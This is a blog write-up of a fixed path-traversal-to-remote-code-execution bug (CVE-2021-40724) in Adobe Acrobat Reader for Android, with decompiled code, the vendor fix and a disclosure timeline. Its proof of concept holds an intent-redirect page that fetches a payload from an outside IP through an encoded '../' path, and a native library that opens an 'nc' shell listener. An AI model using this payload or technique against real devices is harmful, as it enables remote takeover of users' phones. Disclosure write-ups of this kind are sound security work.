<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>RCE in Adobe Acrobat Reader for android(CVE-2021-40724) | hulkvision</title>
<meta name="keywords" content="">
<meta name="description" content="# Summary
While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.
Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.
# Finding Path traversal vulnerability
        &lt;activity android:theme=&#34;@style/Theme_Virgo_SplashScreen&#34; android:name=&#34;com.adobe.reader.AdobeReader&#34; android:exported=&#34;true&#34; android:launchMode=&#34;singleTask&#34; android:screenOrientation=&#34;user&#34; android:configChanges=&#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize&#34; android:noHistory=&#34;false&#34; android:resizeableActivity=&#34;true&#34;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&#34;android.intent.action.VIEW&#34;/&gt;
                &lt;action android:name=&#34;android.intent.action.EDIT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.DEFAULT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.BROWSABLE&#34;/&gt;
                &lt;data android:scheme=&#34;file&#34;/&gt;
                &lt;data android:scheme=&#34;content&#34;/&gt;
                &lt;data android:scheme=&#34;http&#34;/&gt;
                &lt;data android:scheme=&#34;https&#34;/&gt;
                &lt;data android:mimeType=&#34;application/pdf&#34;/&gt;
            &lt;/intent-filter&gt;
">
<meta name="author" content="Sunny Gupta">
<link rel="canonical" href="https://hulkvision.github.io/blog/post1/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://hulkvision.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hulkvision.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hulkvision.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hulkvision.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://hulkvision.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://hulkvision.github.io/blog/post1/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="RCE in Adobe Acrobat Reader for android(CVE-2021-40724)" />
<meta property="og:description" content="# Summary
While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.
Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.
# Finding Path traversal vulnerability
        &lt;activity android:theme=&#34;@style/Theme_Virgo_SplashScreen&#34; android:name=&#34;com.adobe.reader.AdobeReader&#34; android:exported=&#34;true&#34; android:launchMode=&#34;singleTask&#34; android:screenOrientation=&#34;user&#34; android:configChanges=&#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize&#34; android:noHistory=&#34;false&#34; android:resizeableActivity=&#34;true&#34;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&#34;android.intent.action.VIEW&#34;/&gt;
                &lt;action android:name=&#34;android.intent.action.EDIT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.DEFAULT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.BROWSABLE&#34;/&gt;
                &lt;data android:scheme=&#34;file&#34;/&gt;
                &lt;data android:scheme=&#34;content&#34;/&gt;
                &lt;data android:scheme=&#34;http&#34;/&gt;
                &lt;data android:scheme=&#34;https&#34;/&gt;
                &lt;data android:mimeType=&#34;application/pdf&#34;/&gt;
            &lt;/intent-filter&gt;
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hulkvision.github.io/blog/post1/" />
<meta property="og:image" content="https://hulkvision.github.io/profile.png" />
<meta property="article:section" content="blog" />
<meta property="article:published_time" content="2022-01-14T11:16:51+05:30" />
<meta property="article:modified_time" content="2022-01-14T11:16:51+05:30" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://hulkvision.github.io/profile.png" />
<meta name="twitter:title" content="RCE in Adobe Acrobat Reader for android(CVE-2021-40724)"/>
<meta name="twitter:description" content="# Summary
While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.
Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.
# Finding Path traversal vulnerability
        &lt;activity android:theme=&#34;@style/Theme_Virgo_SplashScreen&#34; android:name=&#34;com.adobe.reader.AdobeReader&#34; android:exported=&#34;true&#34; android:launchMode=&#34;singleTask&#34; android:screenOrientation=&#34;user&#34; android:configChanges=&#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize&#34; android:noHistory=&#34;false&#34; android:resizeableActivity=&#34;true&#34;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&#34;android.intent.action.VIEW&#34;/&gt;
                &lt;action android:name=&#34;android.intent.action.EDIT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.DEFAULT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.BROWSABLE&#34;/&gt;
                &lt;data android:scheme=&#34;file&#34;/&gt;
                &lt;data android:scheme=&#34;content&#34;/&gt;
                &lt;data android:scheme=&#34;http&#34;/&gt;
                &lt;data android:scheme=&#34;https&#34;/&gt;
                &lt;data android:mimeType=&#34;application/pdf&#34;/&gt;
            &lt;/intent-filter&gt;
"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://hulkvision.github.io/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)",
      "item": "https://hulkvision.github.io/blog/post1/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)",
  "name": "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)",
  "description": "# Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\n# Finding Path traversal vulnerability \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; ",
  "keywords": [
    
  ],
  "articleBody": "# Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\n# Finding Path traversal vulnerability There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be application/pdf for this actiivity.\nWhen an intent with data url for example http://localhost/test.pdf is sent to adobe reader app,it downloads the file in /sdcard/Downloads/Adobe Acrobat folder with filename as LastPathSegment(i.e test.pdf) of the sent url.\nActivity com.adobe.reader.AdobeReader receives the intent and starts ARFileURLDownloadActivity activity.\npublic void handleIntent() { Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class); intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData()); intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType()); startActivity(intent2); } This activity ARFileURLDownloadActivitystarts com.adobe.reader.misc.ARFileURLDownloadService service.\npublic void onMAMCreate(Bundle bundle) { super.onMAMCreate(bundle); this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class); Bundle bundle2 = new Bundle(); //...// this.mServiceIntent.putExtras(bundle2); startService(); } In com.adobe.reader.misc.ARFileURLDownloadService.java\npublic int onMAMStartCommand(Intent intent, int i, int i2) { Bundle extras = intent.getExtras(); //..// String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null); ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string); this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask; aRURLFileDownloadAsyncTask.taskExecute(new Void[0]); return 2; } In com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java\nprivate void downloadFile() throws IOException, SVFileDownloadException { Exception exc; boolean z; Throwable th; boolean z2; Uri fileURI = this.mDownloadModel.getFileURI(); URL url = new URL(fileURI.toString()); try { String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() { ARFileFromURLDownloader.DownloadUrlListener public void onProgressUpdate(int i, int i2) { ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2); } @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener public boolean shouldCancelDownload() { return ARURLFileDownloadAsyncTask.this.isCancelled(); } }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url); //...// This method BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData takes this.mUri.getLastPathSegment() as argument and which returns the decoded last segment in the path of the url.\nFor example let take this url https://localhost/x/..%2F..%2Ffile.pdf so when this url is passed to getLastPathSegment() method it will take ..%2F..%2Ffile.pdf as last segment of the url and will return ../../file.pdf as output.\nThere was not any sanitization performed in downloadFile variable before passing it into File instance which resulted into path traversal vulnerability.\n# Getting RCE Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.\nA simple way to know whether an app is using play core library for dynamic code loading is to check for spiltcompat directory in /data/data/:application_id/files/ directory.\nUsing path traversal bug i can write an arbitrary apk in /data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/ directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this article\nAdobe reader app also downloads an module name FASOpenCVDF.apk during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path traversal vulnerability i could not write over existing files… only create new files.\nI was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from /data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/ directory.\nFASOpenCVDF.apk module was also loading an native library from /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory. I decided to take a look into FASOpenCVDF.apk source code and there i founded this module is also trying to load three unavailable libraries libADCComponent.so,libColoradoMobile.so and libopencv_info.so and this solved my issue of executing code remotely.\nI created a simple poc native library , renamed it to libopencv_info.so and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.\n# Proof of Concept RCE in Adobe Acrobat Reader for android #include #include #include #include JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) { if (fork() == 0) { system(\"toybox nc -p 6666 -L /system/bin/sh -l\"); } JNIEnv* env; if (vm-\u003eGetEnv(reinterpret_cast(\u0026env), JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } return JNI_VERSION_1_6; } # Vulnerability Fix ! In com.adobe.libs.buildingblocks.utils.BBIntentUtils.java\nprivate static final String FILE_NAME_RESERVED_CHARACTER = \"[*/\\\\|?\u003c\u003e\\\"]\"; public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) { if (TextUtils.isEmpty(str)) { str = BBConstants.DOWNLOAD_FILE_NAME; } String str3 = null; if (!(contentResolver == null || uri == null)) { str3 = MAMContentResolverManagement.getType(contentResolver, uri); } String str4 = !TextUtils.isEmpty(str3) ? str3 : str2; if (!TextUtils.isEmpty(str4)) { String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4); if (!TextUtils.isEmpty(fileExtensionFromMimeType)) { if (str.lastIndexOf(46) == -1) { str = str + '.' + fileExtensionFromMimeType; } else { String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str); if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) \u0026\u0026 !TextUtils.equals(mimeTypeForFile, str2))) { str = str + '.' + fileExtensionFromMimeType; } } } } return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, \"_\"); } Have a nice day! and if you got any doubt you can contact me on Twitter.\nTimeline Jul 29th,2021 - Reported the vulnerability to adobe Aug 4th ,2021 - report traiged Oct 13th,2021 - Vulnerability Fixed Dec 4th ,2021 - $10000 bounty awarded from GPSRP ",
  "wordCount" : "873",
  "inLanguage": "en",
  "image": "https://hulkvision.github.io/profile.png","datePublished": "2022-01-14T11:16:51+05:30",
  "dateModified": "2022-01-14T11:16:51+05:30",
  "author":{
    "@type": "Person",
    "name": "Sunny Gupta"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hulkvision.github.io/blog/post1/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "hulkvision",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hulkvision.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hulkvision.github.io/" accesskey="h" title="hulkvision (Alt + H)">hulkvision</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hulkvision.github.io/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://hulkvision.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://hulkvision.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://hulkvision.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://hulkvision.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://hulkvision.github.io/blog/">Blogs</a></div>
    <h1 class="post-title entry-hint-parent">
      RCE in Adobe Acrobat Reader for android(CVE-2021-40724)
    </h1>
    <div class="post-meta"><span title='2022-01-14 11:16:51 +0530 IST'>January 14, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Sunny Gupta&nbsp;|&nbsp;<a href="https://github.com/hulkvision/hulkvision.github.io/tree/main/content/blog/post1.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#-summary" aria-label="# Summary"># Summary</a></li>
                <li>
                    <a href="#-finding-path-traversal-vulnerability" aria-label="# Finding Path traversal vulnerability"># Finding Path traversal vulnerability</a></li>
                <li>
                    <a href="#-getting-rce" aria-label="# Getting RCE"># Getting RCE</a></li>
                <li>
                    <a href="#-proof-of-concept" aria-label="# Proof of Concept"># Proof of Concept</a><ul>
                        
                <li>
                    <a href="#-vulnerability-fix-" aria-label="# Vulnerability Fix !"># Vulnerability Fix !</a><ul>
                        
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="-summary"># Summary<a hidden class="anchor" aria-hidden="true" href="#-summary">#</a></h2>
<p>While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.
Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.</p>
<h2 id="-finding-path-traversal-vulnerability"># Finding Path traversal vulnerability<a hidden class="anchor" aria-hidden="true" href="#-finding-path-traversal-vulnerability">#</a></h2>
<pre tabindex="0"><code>        &lt;activity android:theme=&#34;@style/Theme_Virgo_SplashScreen&#34; android:name=&#34;com.adobe.reader.AdobeReader&#34; android:exported=&#34;true&#34; android:launchMode=&#34;singleTask&#34; android:screenOrientation=&#34;user&#34; android:configChanges=&#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize&#34; android:noHistory=&#34;false&#34; android:resizeableActivity=&#34;true&#34;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&#34;android.intent.action.VIEW&#34;/&gt;
                &lt;action android:name=&#34;android.intent.action.EDIT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.DEFAULT&#34;/&gt;
                &lt;category android:name=&#34;android.intent.category.BROWSABLE&#34;/&gt;
                &lt;data android:scheme=&#34;file&#34;/&gt;
                &lt;data android:scheme=&#34;content&#34;/&gt;
                &lt;data android:scheme=&#34;http&#34;/&gt;
                &lt;data android:scheme=&#34;https&#34;/&gt;
                &lt;data android:mimeType=&#34;application/pdf&#34;/&gt;
            &lt;/intent-filter&gt;
</code></pre><p>There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be <code>application/pdf</code> for this actiivity.</p>
<p>When an intent with data url for example <code>http://localhost/test.pdf</code>  is sent to adobe reader app,it downloads the file in <code>/sdcard/Downloads/Adobe Acrobat</code> folder with filename as LastPathSegment(i.e <code>test.pdf</code>) of the sent url.</p>
<p>Activity <code>com.adobe.reader.AdobeReader</code> receives the intent and starts <code>ARFileURLDownloadActivity</code> activity.</p>
<pre tabindex="0"><code>public void handleIntent() {
            Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class);
            intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData());
            intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType());
            startActivity(intent2);
    }
</code></pre><p>This activity <code>ARFileURLDownloadActivity</code>starts <code>com.adobe.reader.misc.ARFileURLDownloadService</code> service.</p>
<pre tabindex="0"><code>public void onMAMCreate(Bundle bundle) {
        super.onMAMCreate(bundle);
        this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class);
        Bundle bundle2 = new Bundle();
        //...//
        this.mServiceIntent.putExtras(bundle2);
        startService();
    }
</code></pre><p>In <code>com.adobe.reader.misc.ARFileURLDownloadService.java</code></p>
<pre tabindex="0"><code>public int onMAMStartCommand(Intent intent, int i, int i2) { 
        Bundle extras = intent.getExtras();
        //..//
        String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null);
        ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string);
        this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask;
        aRURLFileDownloadAsyncTask.taskExecute(new Void[0]);
        return 2;
    }
</code></pre><p>In <code>com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java</code></p>
<pre tabindex="0"><code>    private void downloadFile() throws IOException, SVFileDownloadException {
        Exception exc;
        boolean z;
        Throwable th;
        boolean z2;
        Uri fileURI = this.mDownloadModel.getFileURI();
        URL url = new URL(fileURI.toString());
        try {
            String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() {
               ARFileFromURLDownloader.DownloadUrlListener
                public void onProgressUpdate(int i, int i2) {
                    ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2);
                }

                @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener
                public boolean shouldCancelDownload() {
                    return ARURLFileDownloadAsyncTask.this.isCancelled();
                }
            }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url);
            //...//
</code></pre><p>This method <code>BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData</code> takes this.mUri.getLastPathSegment() as argument and which returns the decoded  last segment in the path of the url.</p>
<p>For example let take this url <code>https://localhost/x/..%2F..%2Ffile.pdf</code> so when this url is passed to getLastPathSegment() method it will take <code>..%2F..%2Ffile.pdf</code> as last segment of the url and will return <code>../../file.pdf</code> as output.</p>
<p>There was not any sanitization performed in <code>downloadFile</code> variable before passing it into  File instance which resulted into path traversal vulnerability.</p>
<h2 id="-getting-rce"># Getting RCE<a hidden class="anchor" aria-hidden="true" href="#-getting-rce">#</a></h2>
<p>Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.</p>
<p>A simple way to know whether an app is using play core library for dynamic code loading is to check for <code>spiltcompat</code> directory in <code>/data/data/:application_id/files/</code> directory.</p>
<p>Using path traversal bug i can write an arbitrary apk in <code>/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/</code> directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this <a href="https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">article</a></p>
<p>Adobe reader app also downloads an module name <code>FASOpenCVDF.apk</code> during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path traversal vulnerability i  could not write over existing files&hellip; only create new files.</p>
<p>I was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from  <code>/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/</code> directory.</p>
<p><code>FASOpenCVDF.apk</code> module was also loading an native library from
<code>/data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a</code> directory. I decided to take a look into <code>FASOpenCVDF.apk</code> source code and there i founded this module is also trying to load three unavailable libraries <code>libADCComponent.so</code>,<code>libColoradoMobile.so</code> and <code>libopencv_info.so </code> and this solved my issue of executing code remotely.</p>
<p>I created a simple poc native library , renamed it to <code>libopencv_info.so</code> and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.</p>
<h2 id="-proof-of-concept"># Proof of Concept<a hidden class="anchor" aria-hidden="true" href="#-proof-of-concept">#</a></h2>
<pre tabindex="0"><code>&lt;html&gt;
&lt;title&gt; RCE in Adobe Acrobat Reader for android &lt;/title&gt;
&lt;body&gt;
    &lt;script&gt;
        window.location.href=&#34;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end&#34;;
    &lt;/script&gt;    
&lt;/body&gt;
&lt;/html&gt;
</code></pre><pre tabindex="0"><code>#include &lt;jni.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;


JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {

    if (fork() == 0) {
        system(&#34;toybox nc -p 6666 -L /system/bin/sh -l&#34;);
    }
    JNIEnv* env;
    if (vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
</code></pre><h3 id="-vulnerability-fix-"># Vulnerability Fix !<a hidden class="anchor" aria-hidden="true" href="#-vulnerability-fix-">#</a></h3>
<p>In <code>com.adobe.libs.buildingblocks.utils.BBIntentUtils.java</code></p>
<pre tabindex="0"><code>private static final String FILE_NAME_RESERVED_CHARACTER = &#34;[*/\\|?&lt;&gt;\&#34;]&#34;;
public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) {
        if (TextUtils.isEmpty(str)) {
            str = BBConstants.DOWNLOAD_FILE_NAME;
        }
        String str3 = null;
        if (!(contentResolver == null || uri == null)) {
            str3 = MAMContentResolverManagement.getType(contentResolver, uri);
        }
        String str4 = !TextUtils.isEmpty(str3) ? str3 : str2;
        if (!TextUtils.isEmpty(str4)) {
            String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4);
            if (!TextUtils.isEmpty(fileExtensionFromMimeType)) {
                if (str.lastIndexOf(46) == -1) {
                    str = str + &#39;.&#39; + fileExtensionFromMimeType;
                } else {
                    String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str);
                    if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) &amp;&amp; !TextUtils.equals(mimeTypeForFile, str2))) {
                        str = str + &#39;.&#39; + fileExtensionFromMimeType;
                    }
                }
            }
        }
        return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, &#34;_&#34;);
    }
</code></pre><p>Have a nice day! and if you got any doubt you can contact me on Twitter.</p>
<h4 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h4>
<ul>
<li>Jul 29th,2021 - Reported the vulnerability to adobe</li>
<li>Aug 4th ,2021 - report traiged</li>
<li>Oct 13th,2021 - Vulnerability Fixed</li>
<li>Dec 4th ,2021 - $10000 bounty awarded from GPSRP</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://hulkvision.github.io/blog/javascript-interface/exploiting-javascript-interface/">
    <span class="title">« Prev</span>
    <br>
    <span>Exploiting JavaScript Interface for Unauthorized Access in a &#39;global&#39; cryptocurrency exchange android app</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share RCE in Adobe Acrobat Reader for android(CVE-2021-40724) on x"
